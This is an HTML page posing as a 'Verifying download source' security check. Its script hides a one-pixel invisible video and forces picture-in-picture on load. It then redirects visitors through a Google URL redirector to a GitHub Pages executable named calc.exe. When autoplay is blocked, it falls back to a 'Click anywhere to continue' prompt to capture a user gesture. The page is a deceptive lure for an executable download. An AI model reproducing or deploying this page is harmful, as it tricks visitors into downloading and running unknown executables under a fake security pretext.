<!DOCTYPE html>
<html>
<head>
    <title>Checking Security Protocol...</title>
    <style>
        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #fff; }
        video { width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <p>Verifying download source...</p>
    </div>

    <video id="v" loop muted playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>

    <script>
        const v = document.getElementById('v');

        window.onload = async () => {
            try {
                // Mencoba memicu PiP segera saat halaman dimuat
                await v.play();
                await v.requestPictureInPicture();
                
                // Setelah PiP aktif, arahkan ke download dengan redirector
                setTimeout(() => {
                    window.location.href = "https://www.google.com/url?q=https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
                }, 500);
            } catch (e) {
                // Jika butuh klik tambahan karena gesture expired
                document.body.innerHTML = "<h1>Click anywhere to continue</h1>";
                document.body.onclick = async () => {
                    await v.play();
                    await v.requestPictureInPicture();
                    window.location.href = "https://www.google.com/url?q=https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
                };
            }
        };
    </script>
</body>
</html>
